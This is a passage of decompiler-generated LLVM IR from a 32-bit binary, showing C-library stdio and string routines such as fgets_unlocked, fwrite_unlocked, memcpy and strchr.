  %v0_804f4e0 = load i32, i32* @global_var_805e704.159, align 4
  store i32 ptrtoint (i32* @global_var_805a474.158 to i32), i32* @ecx, align 4
  %v1_804f4e7 = add i32 %v0_804f4e0, 1
  store i32 %v1_804f4e7, i32* @eax, align 4
  store i32 %v1_804f4e7, i32* @global_var_805e704.159, align 4
  %v2_804f4f0 = call i32 @__pthread_return_void(i32 %v2_804f4ca, i32 1)
  store i32 %v2_804f4f0, i32* @eax, align 4
  %v2_804f503 = call i32 @__pthread_return_void(i32 %v2_804f4ca, i32 134552291)
  %v1_804f50f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a45c.162 to i32))
  %v0_804f514 = load i32, i32* bitcast (i32** @global_var_805a458.163 to i32*), align 8
  store i32 %v0_804f514, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_805a45c.162 to i32), i32* @eax, align 4
  %v2_804f51f = call i32 @__pthread_return_void(i32 %v2_804f4ca, i32 1)
  %v0_804f5a61 = load i32, i32* @esi, align 4
  %v1_804f5a62 = icmp eq i32 %v0_804f5a61, 0
  %v1_804f5a89 = icmp eq i1 %v1_804f5a62, false
  br i1 %v1_804f5a89, label %dec_label_pc_804f529, label %dec_label_pc_804f5ae

dec_label_pc_804f529:                             ; preds = %dec_label_pc_804f4bd, %dec_label_pc_804f5a3
  %v0_804f537 = phi i32 [ %v3_804f5a3, %dec_label_pc_804f5a3 ], [ %v0_804f5a61, %dec_label_pc_804f4bd ]
  %v1_804f529 = inttoptr i32 %v0_804f537 to i8*
  %v2_804f529 = load i8, i8* %v1_804f529, align 1
  %v3_804f529 = and i8 %v2_804f529, 64
  %v4_804f529 = icmp eq i8 %v3_804f529, 0
  br i1 %v4_804f529, label %dec_label_pc_804f5a3, label %dec_label_pc_804f52e

dec_label_pc_804f52e:                             ; preds = %dec_label_pc_804f529
  %v0_804f52e = load i32, i32* @global_var_805a48c.161, align 4
  %v9_804f52e = icmp eq i32 %v0_804f52e, 2
  br i1 %v9_804f52e, label %dec_label_pc_804f556, label %dec_label_pc_804f537

dec_label_pc_804f537:                             ; preds = %dec_label_pc_804f52e
  %v1_804f537 = add i32 %v0_804f537, 56
  store i32 %v1_804f537, i32* @ebx, align 4
  store i32 %v2_804f4ca, i32* @eax, align 4
  %v2_804f546 = call i32 @__pthread_return_void(i32 %v2_804f4ca, i32 134552291)
  %v0_804f54b = load i32, i32* @ebx, align 4
  %v1_804f54e = call i32 @__pthread_return_0(i32 %v0_804f54b)
  %v0_804f556.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f556

dec_label_pc_804f556:                             ; preds = %dec_label_pc_804f52e, %dec_label_pc_804f537
  %v0_804f569 = phi i32 [ %v0_804f537, %dec_label_pc_804f52e ], [ %v0_804f556.pre, %dec_label_pc_804f537 ]
  %v1_804f556 = inttoptr i32 %v0_804f569 to i32*
  %v2_804f556 = load i32, i32* %v1_804f556, align 4
  %v1_804f558 = load i32, i32* @ebp, align 4
  %v2_804f558 = or i32 %v1_804f558, %v2_804f556
  %v1_804f55a = and i32 %v2_804f558, 832
  %v2_804f55f = icmp eq i32 %v1_804f55a, 320
  %v1_804f564 = icmp eq i1 %v2_804f55f, false
  br i1 %v1_804f564, label %dec_label_pc_804f589, label %dec_label_pc_804f566

dec_label_pc_804f566:                             ; preds = %dec_label_pc_804f556
  %v1_804f56a = call i32 @__stdio_wcommit(i32 %v0_804f569)
  %v1_804f572 = icmp eq i32 %v1_804f56a, 0
  br i1 %v1_804f572, label %dec_label_pc_804f57b, label %dec_label_pc_804f576

dec_label_pc_804f576:                             ; preds = %dec_label_pc_804f566
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804f589

dec_label_pc_804f57b:                             ; preds = %dec_label_pc_804f566
  %v0_804f57b = load i32, i32* @esi, align 4
  %v1_804f57b = add i32 %v0_804f57b, 8
  %v2_804f57b = inttoptr i32 %v1_804f57b to i32*
  %v3_804f57b = load i32, i32* %v2_804f57b, align 4
  %v2_804f57e = add i32 %v0_804f57b, 28
  %v3_804f57e = inttoptr i32 %v2_804f57e to i32*
  store i32 %v3_804f57b, i32* %v3_804f57e, align 4
  %v0_804f581 = load i32, i32* @esi, align 4
  %v1_804f581 = inttoptr i32 %v0_804f581 to i32*
  %v2_804f581 = load i32, i32* %v1_804f581, align 4
  %v2_804f581.tr = trunc i32 %v2_804f581 to i16
  %v1_804f586 = and i16 %v2_804f581.tr, -65
  %v3_804f586 = inttoptr i32 %v0_804f581 to i16*
  store i16 %v1_804f586, i16* %v3_804f586, align 2
  br label %dec_label_pc_804f589

dec_label_pc_804f589:                             ; preds = %dec_label_pc_804f556, %dec_label_pc_804f576, %dec_label_pc_804f57b
  %v0_804f589 = load i32, i32* @global_var_805a48c.161, align 4
  %v9_804f589 = icmp eq i32 %v0_804f589, 2
  br i1 %v9_804f589, label %dec_label_pc_804f5a3, label %dec_label_pc_804f592

dec_label_pc_804f592:                             ; preds = %dec_label_pc_804f589
  store i32 %v2_804f4ca, i32* @eax, align 4
  %v2_804f59b = call i32 @__pthread_return_void(i32 %v2_804f4ca, i32 1)
  br label %dec_label_pc_804f5a3

dec_label_pc_804f5a3:                             ; preds = %dec_label_pc_804f589, %dec_label_pc_804f529, %dec_label_pc_804f592
  %v0_804f5a3 = load i32, i32* @esi, align 4
  %v1_804f5a3 = add i32 %v0_804f5a3, 32
  %v2_804f5a3 = inttoptr i32 %v1_804f5a3 to i32*
  %v3_804f5a3 = load i32, i32* %v2_804f5a3, align 4
  store i32 %v3_804f5a3, i32* @esi, align 4
  %v1_804f5a6 = icmp eq i32 %v3_804f5a3, 0
  %v1_804f5a8 = icmp eq i1 %v1_804f5a6, false
  br i1 %v1_804f5a8, label %dec_label_pc_804f529, label %dec_label_pc_804f5ae

dec_label_pc_804f5ae:                             ; preds = %dec_label_pc_804f5a3, %dec_label_pc_804f4bd
  %v0_804f5ae = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_804f5df

dec_label_pc_804f5b5:                             ; preds = %dec_label_pc_804f4b1
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_804f5b7 = load i8, i8* %tmp23, align 1
  %v4_804f5b7 = and i8 %v3_804f5b7, 64
  %v5_804f5b7 = icmp eq i8 %v4_804f5b7, 0
  br i1 %v5_804f5b7, label %dec_label_pc_804f5df, label %dec_label_pc_804f5bc

dec_label_pc_804f5bc:                             ; preds = %dec_label_pc_804f5b5
  store i32 -1, i32* @edi, align 4
  %v1_804f5c3 = call i32 @__stdio_wcommit(i32 %v4_804f4a5)
  %v1_804f5cb = icmp eq i32 %v1_804f5c3, 0
  %v1_804f5cd = icmp eq i1 %v1_804f5cb, false
  br i1 %v1_804f5cd, label %dec_label_pc_804f5df, label %dec_label_pc_804f5cf

dec_label_pc_804f5cf:                             ; preds = %dec_label_pc_804f5bc
  %v2_804f5cf = add i32 %v4_804f4a5, 8
  %v3_804f5cf = inttoptr i32 %v2_804f5cf to i32*
  %v4_804f5cf = load i32, i32* %v3_804f5cf, align 4
  store i32 0, i32* @edi, align 4
  %v3_804f5d4 = add i32 %v4_804f4a5, 28
  %v4_804f5d4 = inttoptr i32 %v3_804f5d4 to i32*
  store i32 %v4_804f5cf, i32* %v4_804f5d4, align 4
  %tmp24 = bitcast i16* %arg1 to i32*
  %v3_804f5d7 = load i32, i32* %tmp24, align 4
  %v3_804f5d7.tr = trunc i32 %v3_804f5d7 to i16
  %v1_804f5dc = and i16 %v3_804f5d7.tr, -65
  store i16 %v1_804f5dc, i16* %arg1, align 2
  br label %dec_label_pc_804f5df

dec_label_pc_804f5df:                             ; preds = %dec_label_pc_804f5bc, %dec_label_pc_804f5b5, %dec_label_pc_804f5ae, %dec_label_pc_804f5cf
  %v0_804f5e2 = load i32, i32* @edi, align 4
  store i32 %v0_804f4a1, i32* @ebx, align 4
  store i32 %v0_804f4a0, i32* @esi, align 4
  store i32 %v0_804f49f, i32* @edi, align 4
  store i32 %v0_804f49c, i32* @ebp, align 4
  ret i32 %v0_804f5e2

; uselistorder directives
  uselistorder i32 %v3_804f5a3, { 1, 2, 0 }
  uselistorder i32 %v2_804f4ca, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32* bitcast (i32** @global_var_805a458.163 to i32*), { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* @global_var_805e704.159, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_805a474.158 to i32), { 1, 3, 4, 5, 6, 9, 2, 7, 0, 8 }
  uselistorder i16* %arg1, { 4, 2, 3, 1, 0, 5 }
  uselistorder label %dec_label_pc_804f5df, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804f5a3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f589, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f556, { 1, 0 }
  uselistorder label %dec_label_pc_804f529, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_804f5ec = load i32, i32* @ebp, align 4
  %v4_804f5f7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f5f7, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_804f5f7, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_804f63d.preheader, label %dec_label_pc_804f649

dec_label_pc_804f63d.preheader:                   ; preds = %entry
  %v1_804f63d19 = add i32 %arg2, -1
  %v8_804f63d23 = icmp eq i32 %v1_804f63d19, 0
  store i32 %v1_804f63d19, i32* @esi, align 4
  %v1_804f63e25 = icmp eq i1 %v8_804f63d23, false
  br i1 %v1_804f63e25, label %dec_label_pc_804f607, label %dec_label_pc_804f640

dec_label_pc_804f607:                             ; preds = %dec_label_pc_804f63d.preheader, %dec_label_pc_804f63b.dec_label_pc_804f63d_crit_edge.dec_label_pc_804f607_crit_edge
  %v0_804f607 = phi i32 [ %v0_804f607.pre, %dec_label_pc_804f63b.dec_label_pc_804f63d_crit_edge.dec_label_pc_804f607_crit_edge ], [ %arg3, %dec_label_pc_804f63d.preheader ]
  %v1_804f607 = add i32 %v0_804f607, 16
  %v2_804f607 = inttoptr i32 %v1_804f607 to i32*
  %v3_804f607 = load i32, i32* %v2_804f607, align 4
  store i32 %v3_804f607, i32* %eax.global-to-local, align 4
  %v2_804f60a = add i32 %v0_804f607, 24
  %v3_804f60a = inttoptr i32 %v2_804f60a to i32*
  %v4_804f60a = load i32, i32* %v3_804f60a, align 4
  %v10_804f60a = icmp ult i32 %v3_804f607, %v4_804f60a
  %v1_804f60d = icmp eq i1 %v10_804f60a, false
  br i1 %v1_804f60d, label %dec_label_pc_804f61d, label %dec_label_pc_804f60f

dec_label_pc_804f60f:                             ; preds = %dec_label_pc_804f607
  %v1_804f60f = inttoptr i32 %v3_804f607 to i8*
  %v2_804f60f = load i8, i8* %v1_804f60f, align 1
  %v3_804f60f = zext i8 %v2_804f60f to i32
  %v4_804f60f = load i32, i32* @edx, align 4
  %v5_804f60f = and i32 %v4_804f60f, -256
  %v6_804f60f = or i32 %v5_804f60f, %v3_804f60f
  store i32 %v6_804f60f, i32* @edx, align 4
  %v1_804f611 = add i32 %v3_804f607, 1
  store i32 %v1_804f611, i32* %eax.global-to-local, align 4
  %v2_804f612 = load i32, i32* @ebx, align 4
  %v3_804f612 = inttoptr i32 %v2_804f612 to i8*
  store i8 %v2_804f60f, i8* %v3_804f612, align 1
  %v0_804f614 = load i32, i32* @ebx, align 4
  %v1_804f614 = add i32 %v0_804f614, 1
  store i32 %v1_804f614, i32* @ebx, align 4
  %v0_804f615 = load i32, i32* @edx, align 4
  %v1_804f615 = trunc i32 %v0_804f615 to i8
  %v10_804f615 = icmp eq i8 %v1_804f615, 10
  %v0_804f618 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f618 = load i32, i32* @ebp, align 4
  %v2_804f618 = add i32 %v1_804f618, 16
  %v3_804f618 = inttoptr i32 %v2_804f618 to i32*
  store i32 %v0_804f618, i32* %v3_804f618, align 4
  br i1 %v10_804f615, label %dec_label_pc_804f640, label %dec_label_pc_804f63b.dec_label_pc_804f63d_crit_edge

dec_label_pc_804f61d:                             ; preds = %dec_label_pc_804f607
  %v0_804f621 = call i32 @getc_unlocked()
  %v1_804f621 = trunc i32 %v0_804f621 to i8
  store i32 %v0_804f621, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v0_804f621, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_804f62c = icmp eq i1 %tmp, false
  br i1 %v1_804f62c, label %dec_label_pc_804f63b, label %dec_label_pc_804f62e

dec_label_pc_804f62e:                             ; preds = %dec_label_pc_804f61d
  %v0_804f62e = load i32, i32* @ebp, align 4
  %v1_804f62e = inttoptr i32 %v0_804f62e to i8*
  %v2_804f62e = load i8, i8* %v1_804f62e, align 1
  %v3_804f62e = and i8 %v2_804f62e, 8
  %v4_804f62e = icmp eq i8 %v3_804f62e, 0
  br i1 %v4_804f62e, label %dec_label_pc_804f640, label %dec_label_pc_804f649

dec_label_pc_804f63b:                             ; preds = %dec_label_pc_804f61d
  %v3_804f636 = load i32, i32* @ebx, align 4
  %v4_804f636 = inttoptr i32 %v3_804f636 to i8*
  store i8 %v1_804f621, i8* %v4_804f636, align 1
  %v0_804f638 = load i32, i32* @ebx, align 4
  %v1_804f638 = add i32 %v0_804f638, 1
  store i32 %v1_804f638, i32* @ebx, align 4
  %v11_804f639 = icmp eq i8 %v1_804f621, 10
  br i1 %v11_804f639, label %dec_label_pc_804f640, label %dec_label_pc_804f63b.dec_label_pc_804f63d_crit_edge

dec_label_pc_804f63b.dec_label_pc_804f63d_crit_edge: ; preds = %dec_label_pc_804f60f, %dec_label_pc_804f63b
  %v0_804f63d.pre = load i32, i32* @esi, align 4
  %v1_804f63d = add i32 %v0_804f63d.pre, -1
  %v8_804f63d = icmp eq i32 %v1_804f63d, 0
  store i32 %v1_804f63d, i32* @esi, align 4
  %v1_804f63e = icmp eq i1 %v8_804f63d, false
  br i1 %v1_804f63e, label %dec_label_pc_804f63b.dec_label_pc_804f63d_crit_edge.dec_label_pc_804f607_crit_edge, label %dec_label_pc_804f640

dec_label_pc_804f63b.dec_label_pc_804f63d_crit_edge.dec_label_pc_804f607_crit_edge: ; preds = %dec_label_pc_804f63b.dec_label_pc_804f63d_crit_edge
  %v0_804f607.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f607

dec_label_pc_804f640:                             ; preds = %dec_label_pc_804f63d.preheader, %dec_label_pc_804f60f, %dec_label_pc_804f63b.dec_label_pc_804f63d_crit_edge, %dec_label_pc_804f63b, %dec_label_pc_804f62e
  %v0_804f640 = load i32, i32* @ebx, align 4
  %v1_804f640 = load i32, i32* @edi, align 4
  %tmp27 = icmp ugt i32 %v0_804f640, %v1_804f640
  br i1 %tmp27, label %dec_label_pc_804f644, label %dec_label_pc_804f649

dec_label_pc_804f644:                             ; preds = %dec_label_pc_804f640
  %v1_804f644 = inttoptr i32 %v0_804f640 to i8*
  store i8 0, i8* %v1_804f644, align 1
  %v0_804f64e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804f64b

dec_label_pc_804f649:                             ; preds = %dec_label_pc_804f640, %dec_label_pc_804f62e, %entry
  br label %dec_label_pc_804f64b

dec_label_pc_804f64b:                             ; preds = %dec_label_pc_804f644, %dec_label_pc_804f649
  %v0_804f64e = phi i32 [ %v0_804f64e.pre, %dec_label_pc_804f644 ], [ 0, %dec_label_pc_804f649 ]
  store i32 %v0_804f64e, i32* %eax.global-to-local, align 4
  store i32 %v0_804f5ec, i32* @ebp, align 4
  ret i32 %v0_804f64e

; uselistorder directives
  uselistorder i32 %v0_804f64e, { 1, 0 }
  uselistorder i32 %v0_804f640, { 1, 0 }
  uselistorder i32 %v1_804f63d, { 1, 0 }
  uselistorder i32 %v0_804f621, { 0, 2, 1 }
  uselistorder i32 %v0_804f607, { 1, 0 }
  uselistorder label %dec_label_pc_804f64b, { 1, 0 }
  uselistorder label %dec_label_pc_804f640, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_804f63b.dec_label_pc_804f63d_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804f607, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804f658 = load i32, i32* @esi, align 4
  %v0_804f659 = load i32, i32* @ebx, align 4
  store i32 %v0_804f659, i32* %stack_var_-8, align 4
  %v4_804f65d = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f65d, i32* @ebx, align 4
  %v3_804f662 = call i32 @strlen(i8* %arg1)
  store i32 %v3_804f662, i32* @esi, align 4
  %v0_804f673 = load i32, i32* @ebx, align 4
  %v6_804f674 = call i32 @__GI_fwrite_unlocked(i32 %v0_804f673, i64 1, i32 %v3_804f662, i32 %arg2)
  %v1_804f67e = load i32, i32* @esi, align 4
  %v12_804f67e = icmp eq i32 %v6_804f674, %v1_804f67e
  %v3_804f680 = select i1 %v12_804f67e, i32 %v6_804f674, i32 -1
  %v2_804f686 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f686, i32* @ebx, align 4
  store i32 %v0_804f658, i32* @esi, align 4
  ret i32 %v3_804f680

; uselistorder directives
  uselistorder i32 %v6_804f674, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_804f68c = load i32, i32* @edi, align 4
  %v0_804f68d = load i32, i32* @esi, align 4
  %v0_804f68e = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_804f693 = trunc i64 %arg2 to i32
  store i32 %v4_804f693, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_804f69b = inttoptr i32 %arg4 to i16*
  %v2_804f69b = load i16, i16* %v1_804f69b, align 2
  %v1_804f69e = and i16 %v2_804f69b, 192
  %v6_804f6a3 = icmp eq i16 %v1_804f69e, 192
  br i1 %v6_804f6a3, label %dec_label_pc_804f6be, label %dec_label_pc_804f6aa

dec_label_pc_804f6aa:                             ; preds = %entry
  %v0_804f6aa = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v9_804f6b2 = call i32 @__stdio_trans2w_o(i16* %v1_804f69b, i32 128, i32 %v0_804f6aa, i32 %v0_804f6aa, i32 %v0_804f68e, i32 %v0_804f68d, i32 %v0_804f68c)
  %v1_804f6ba = icmp eq i32 %v9_804f6b2, 0
  %v1_804f6bc = icmp eq i1 %v1_804f6ba, false
  br i1 %v1_804f6bc, label %dec_label_pc_804f6fe, label %dec_label_pc_804f6be

dec_label_pc_804f6be:                             ; preds = %dec_label_pc_804f6aa, %entry
  %v2_804f6be = icmp eq i32 %v4_804f693, 0
  br i1 %v2_804f6be, label %dec_label_pc_804f6fe, label %dec_label_pc_804f6c2

dec_label_pc_804f6c2:                             ; preds = %dec_label_pc_804f6be
  %v1_804f6c2 = icmp eq i32 %arg3, 0
  br i1 %v1_804f6c2, label %dec_label_pc_804f6fe, label %dec_label_pc_804f6c6

dec_label_pc_804f6c6:                             ; preds = %dec_label_pc_804f6c2
  %v9_804f6cb = udiv i64 4294967295, %arg2
  %v10_804f6cb = trunc i64 %v9_804f6cb to i32
  %v6_804f6cf = icmp ult i32 %v10_804f6cb, %arg3
  br i1 %v6_804f6cf, label %dec_label_pc_804f6eb, label %dec_label_pc_804f6d1

dec_label_pc_804f6d1:                             ; preds = %dec_label_pc_804f6c6
  %sext = mul i64 %arg2, 4294967296
  %v2_804f6d4 = sdiv i64 %sext, 4294967296
  %v3_804f6d4 = sext i32 %arg3 to i64
  %v4_804f6d4 = mul nsw i64 %v3_804f6d4, %v2_804f6d4
  %v5_804f6d4 = trunc i64 %v4_804f6d4 to i32
  %v0_804f6d7 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_804f6dd = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_804f6d4, i32 %v0_804f6d7, i32 %v10_804f6cb)
  %v6_804f6dd = sext i32 %v5_804f6dd to i64
  %v10_804f6e7 = udiv i64 %v6_804f6dd, %arg2
  %v11_804f6e7 = trunc i64 %v10_804f6e7 to i32
  br label %dec_label_pc_804f700

dec_label_pc_804f6eb:                             ; preds = %dec_label_pc_804f6c6
  %v0_804f6eb = load i32, i32* @ebx, align 4
  %v1_804f6eb = inttoptr i32 %v0_804f6eb to i32*
  %v2_804f6eb = load i32, i32* %v1_804f6eb, align 4
  %v1_804f6ed = or i32 %v2_804f6eb, 8
  %v1_804f6f0 = trunc i32 %v1_804f6ed to i16
  %v3_804f6f0 = inttoptr i32 %v0_804f6eb to i16*
  store i16 %v1_804f6f0, i16* %v3_804f6f0, align 2
  %v0_804f6f3 = load i32, i32* %stack_var_-28, align 4
  %v1_804f6f3 = call i32 @__errno_location(i32 %v0_804f6f3)
  %v1_804f6f8 = inttoptr i32 %v1_804f6f3 to i32*
  store i32 22, i32* %v1_804f6f8, align 4
  br label %dec_label_pc_804f6fe

dec_label_pc_804f6fe:                             ; preds = %dec_label_pc_804f6c2, %dec_label_pc_804f6be, %dec_label_pc_804f6aa, %dec_label_pc_804f6eb
  br label %dec_label_pc_804f700

dec_label_pc_804f700:                             ; preds = %dec_label_pc_804f6d1, %dec_label_pc_804f6fe
  %v0_804f703 = phi i32 [ %v11_804f6e7, %dec_label_pc_804f6d1 ], [ 0, %dec_label_pc_804f6fe ]
  store i32 %v0_804f68d, i32* @esi, align 4
  store i32 %v0_804f68c, i32* @edi, align 4
  ret i32 %v0_804f703

; uselistorder directives
  uselistorder i32 %v0_804f6aa, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i64 %arg2, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f700, { 1, 0 }
  uselistorder label %dec_label_pc_804f6fe, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f705 = load i32, i32* @esi, align 4
  store i32 %v0_804f705, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_804f706 = sdiv i32 %sext, 16777216
  store i32 %v4_804f706, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f70e = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f70e, i32* %edi.global-to-local, align 4
  %v2_804f714 = udiv i32 %v4_804f706, 4
  %v3_804f717 = inttoptr i32 %arg2 to i8*
  %v4_804f717 = bitcast i16* %arg1 to i8*
  %v5_804f717 = call i8* @_memcpy(i8* %v4_804f717, i8* %v3_804f717, i32 %v2_804f714)
  %v6_804f717 = ptrtoint i8* %v5_804f717 to i32
  store i32 %v6_804f717, i32* @ecx, align 4
  %v0_804f719 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f719 = and i32 %v0_804f719, 2
  %v3_804f719 = icmp eq i32 %v2_804f719, 0
  br i1 %v3_804f719, label %dec_label_pc_804f71f, label %dec_label_pc_804f71d

dec_label_pc_804f71d:                             ; preds = %entry
  %v0_804f71d = load i32, i32* %esi.global-to-local, align 4
  %v1_804f71d = inttoptr i32 %v0_804f71d to i16*
  %v2_804f71d = load i16, i16* %v1_804f71d, align 2
  %v3_804f71d = load i32, i32* %edi.global-to-local, align 4
  %v4_804f71d = inttoptr i32 %v3_804f71d to i16*
  store i16 %v2_804f71d, i16* %v4_804f71d, align 2
  %v5_804f71d = load i32, i32* %edi.global-to-local, align 4
  %v6_804f71d = load i32, i32* %esi.global-to-local, align 4
  %v7_804f71d = load i1, i1* @df, align 1
  %v8_804f71d = select i1 %v7_804f71d, i32 -2, i32 2
  %v9_804f71d = add i32 %v8_804f71d, %v5_804f71d
  %v10_804f71d = add i32 %v8_804f71d, %v6_804f71d
  store i32 %v9_804f71d, i32* %edi.global-to-local, align 4
  store i32 %v10_804f71d, i32* %esi.global-to-local, align 4
  %v0_804f71f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f71f

dec_label_pc_804f71f:                             ; preds = %entry, %dec_label_pc_804f71d
  %v0_804f71f = phi i32 [ %v0_804f719, %entry ], [ %v0_804f71f.pre, %dec_label_pc_804f71d ]
  %v2_804f71f = urem i32 %v0_804f71f, 2
  %v3_804f71f = icmp eq i32 %v2_804f71f, 0
  br i1 %v3_804f71f, label %dec_label_pc_804f724, label %dec_label_pc_804f723

dec_label_pc_804f723:                             ; preds = %dec_label_pc_804f71f
  %v0_804f723 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f723 = inttoptr i32 %v0_804f723 to i8*
  %v2_804f723 = load i8, i8* %v1_804f723, align 1
  %v3_804f723 = load i32, i32* %edi.global-to-local, align 4
  %v4_804f723 = inttoptr i32 %v3_804f723 to i8*
  store i8 %v2_804f723, i8* %v4_804f723, align 1
  %v5_804f723 = load i32, i32* %edi.global-to-local, align 4
  %v6_804f723 = load i32, i32* %esi.global-to-local, align 4
  %v7_804f723 = load i1, i1* @df, align 1
  %v8_804f723 = select i1 %v7_804f723, i32 -1, i32 1
  %v9_804f723 = add i32 %v8_804f723, %v5_804f723
  %v10_804f723 = add i32 %v8_804f723, %v6_804f723
  store i32 %v9_804f723, i32* %edi.global-to-local, align 4
  store i32 %v10_804f723, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f724

dec_label_pc_804f724:                             ; preds = %dec_label_pc_804f71f, %dec_label_pc_804f723
  store i32 %v4_804f70e, i32* %eax.global-to-local, align 4
  %v2_804f728 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f728, i32* @esi, align 4
  ret i32 %v4_804f70e

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_804f724, { 1, 0 }
  uselistorder label %dec_label_pc_804f71f, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_804f72c = load i32, i32* @edi, align 4
  %v4_804f735 = ptrtoint i8* %arg1 to i32
  %v5_804f739 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_804f739 = ptrtoint i8* %v5_804f739 to i32
  store i32 %v6_804f739, i32* @ecx, align 4
  store i32 %v0_804f72c, i32* @edi, align 4
  ret i32 %v4_804f735

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804f745 = ptrtoint i8* %arg1 to i32
  %v2_804f74d = mul i32 %arg2, 256
  %v3_804f74d = and i32 %v2_804f74d, 65280
  %v4_804f74d = and i32 %arg2, -65281
  %v5_804f74d = or i32 %v3_804f74d, %v4_804f74d
  %v8_804f74f.pre = load i1, i1* @df, align 1
  %v9_804f74f = select i1 %v8_804f74f.pre, i32 -1, i32 1
  br label %dec_label_pc_804f74f

dec_label_pc_804f74f:                             ; preds = %dec_label_pc_804f754, %entry
  %v4_804f74f = phi i32 [ %v6_804f74f, %dec_label_pc_804f754 ], [ %v5_804f74d, %entry ]
  %v7_804f74f = phi i32 [ %v10_804f74f, %dec_label_pc_804f754 ], [ %v4_804f745, %entry ]
  %v1_804f74f = inttoptr i32 %v7_804f74f to i8*
  %v2_804f74f = load i8, i8* %v1_804f74f, align 1
  %v10_804f74f = add i32 %v7_804f74f, %v9_804f74f
  %v3_804f750 = udiv i32 %v4_804f74f, 256
  %v4_804f750 = trunc i32 %v3_804f750 to i8
  %v16_804f750 = icmp eq i8 %v2_804f74f, %v4_804f750
  br i1 %v16_804f750, label %dec_label_pc_804f75d, label %dec_label_pc_804f754

dec_label_pc_804f754:                             ; preds = %dec_label_pc_804f74f
  %v3_804f74f = zext i8 %v2_804f74f to i32
  %v5_804f74f = and i32 %v4_804f74f, -256
  %v6_804f74f = or i32 %v3_804f74f, %v5_804f74f
  %v4_804f754 = icmp eq i8 %v2_804f74f, 0
  %v1_804f756 = icmp eq i1 %v4_804f754, false
  br i1 %v1_804f756, label %dec_label_pc_804f74f, label %dec_label_pc_804f758

dec_label_pc_804f758:                             ; preds = %dec_label_pc_804f754
  br label %dec_label_pc_804f75d

dec_label_pc_804f75d:                             ; preds = %dec_label_pc_804f74f, %dec_label_pc_804f758
  %v0_804f75d = phi i32 [ 1, %dec_label_pc_804f758 ], [ %v10_804f74f, %dec_label_pc_804f74f ]
  %v1_804f75f = add i32 %v0_804f75d, -1
  ret i32 %v1_804f75f

; uselistorder directives
  uselistorder i8 %v2_804f74f, { 1, 2, 0 }
  uselistorder i32 %v4_804f74f, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804f75d, { 1, 0 }
}

